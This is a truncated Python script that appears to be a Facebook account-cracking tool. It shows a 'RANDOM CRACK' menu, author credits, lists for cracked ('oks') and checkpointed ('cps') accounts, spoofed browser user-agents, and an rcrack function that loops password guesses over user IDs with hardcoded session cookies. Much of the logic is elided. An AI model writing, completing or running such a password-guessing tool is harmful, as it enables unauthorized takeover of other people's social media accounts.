...
def o():
    ...
    jalan('   ')
    print('')
    jalan('\x1b[1;97m [1]\x1b[1;97m RANDOM CRACK ')
    jalan('\x1b[1;97m [2]\x1b[1;97mCONTACT ME ON FACEBOOK')
    jalan('\x1b[1;97m[00] \x1b[1;97mEXIT')
...
\033[1;32m=================================================
\033[1;97m     \033[1;97mmAUTHOR.     :  \033[1;97mMUGHAL ZADA
\033[1;97m     \033[1;97mFACEBOK       : \033[1;97mMUGHAL ZADA  
\033[1;97m     \033[1;97mGITHUB       :  \033[1;97mXD-MUGHALZADA 00
\033[1;32m=================================================\n""")
loop = 0
oks = [] 
cps = []
...
for xd in range(10000): 
    aa='Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36'
...
def rcrack(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            'cookie': 'datr=TRt7Y3q_sGckMeO4Ni9EB4lq; sb=TRt7YzqKeD6v7v_nsSaYQz9h; m_pixel_ratio=1.875; wd=980x1853; fr=01nV2fVdVMCWIY2QW..BjextN.FD.AAA.0.0.BjfC48.AWUhysxLQjY',
